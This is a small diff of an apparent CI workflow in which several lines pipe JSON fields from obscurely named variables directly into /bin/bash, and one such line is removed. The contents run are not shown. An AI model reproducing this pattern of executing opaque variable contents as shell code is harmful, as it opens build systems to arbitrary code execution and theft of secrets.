@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$sjexa888" | jq -r .dbrh6378 | /bin/bash
           printf '%s' "$xvlh12" | jq -r .pzs44689 | /bin/bash
           echo $gbj228 | jq -r .drdh0 | /bin/bash
-          echo $e1210 | jq -r .ry84 | /bin/bash
           printf '%s' "$ft6" | jq -r .rqgj8543 | /bin/bash
 
       - name: Save artifact
